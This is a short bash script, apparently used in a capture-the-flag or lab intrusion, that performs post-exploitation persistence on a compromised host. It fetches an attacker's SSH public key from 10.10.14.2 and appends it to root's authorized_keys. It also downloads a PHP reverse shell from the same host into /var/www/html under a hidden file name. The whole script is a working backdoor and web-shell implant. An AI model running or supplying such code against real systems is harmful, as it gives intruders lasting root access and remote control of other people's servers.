#!/bin/bash

mkdir /root/.ssh/
chmod 600 /root/.ssh
curl 10.10.14.2/automas.pub >> /root/.ssh/authorized_keys
curl 10.10.14.2/php-reverse-shell.php -o /var/www/html/.jedlione.php
